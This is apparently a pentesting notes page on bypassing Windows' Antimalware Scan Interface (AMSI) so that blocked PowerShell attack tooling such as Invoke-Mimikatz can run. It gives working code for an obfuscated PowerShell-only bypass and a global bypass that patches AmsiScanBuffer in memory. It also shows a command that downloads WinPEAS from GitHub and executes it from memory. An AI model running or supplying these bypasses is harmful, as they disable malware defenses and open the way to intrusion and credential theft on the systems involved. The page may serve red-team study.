---
description: >-
  Windows's Antimalware Scan Interface (AMSI) tries to protect systems against
  suspicious scripts, but like most things, can easily be bypassed
---

# AMSI Bypass

When you run PowerShell code from the command-line, or from a `.ps1` script, AMSI will look at the code and if it finds any malicious-looking code, it will throw a `ScriptContainedMaliciousContent` error and not execute it. When you want to execute your exploit script, this can get in the way.&#x20;

A straightforward way to **test** if AMSI is enabled is to include a string that is always blocked, such as "`Invoke-Mimikatz`".&#x20;

There are many different bypasses that will disable AMSI, without being detected itself. These evolve over time as AMSI blocks more ways, but attackers are quick to find new bypasses by obfuscating certain parts in different ways.&#x20;

There are 2 types of bypasses, as explained clearly in the post below:

{% embed url="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" %}
Powershell-only VS global AMSI bypasses explained
{% endembed %}

1. **PowerShell-only**: This only prevents the `ScriptContainedMaliciousContent` check from blocking your exploit, but not anything more. When loading .NET assemblies it might still fail
2. **Global**: Disable all AMSI protections, including .NET assemblies

{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}
List of many different known AMSI bypasses that are updated
{% endembed %}

{% embed url="https://amsi.fail/" %}
Automatic PowerShell AMSI bypass generator, creates a new bypass every time
{% endembed %}

Some **PowerShell-only** bypasses like the following will disable AMSI for all future PowerShell commands in that same process:

{% code title="Obfuscated PowerShell-only" %}
```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")
```
{% endcode %}

Afterward, you can successfully run scripts that AMSI would normally block, like `Invoke-Mimikatz`. But with such a bypass not every protection is gone yet. When you load a .NET assembly for example you might receive the following cryptic error:

<figure><img src="../.gitbook/assets/image (3) (4).png" alt=""><figcaption><p>Screenshot from @S3cur3Th1sSh1t when trying to execute something that requires loading a .NET assembly</p></figcaption></figure>

To get past this, we'll need a **global** bypass that disables it completely. If you have done the PowerShell-only bypass already, you don't even need to obfuscate it anymore:

{% code title="Unobfuscated global bypass" %}
```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
{% endcode %}

After running this, every AMSI protection should be disabled and you are able to run .NET assemblies again. For example, [WinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) can be run like this:

```powershell
# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# Download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); 
[winPEAS.Program]::Main("")
```
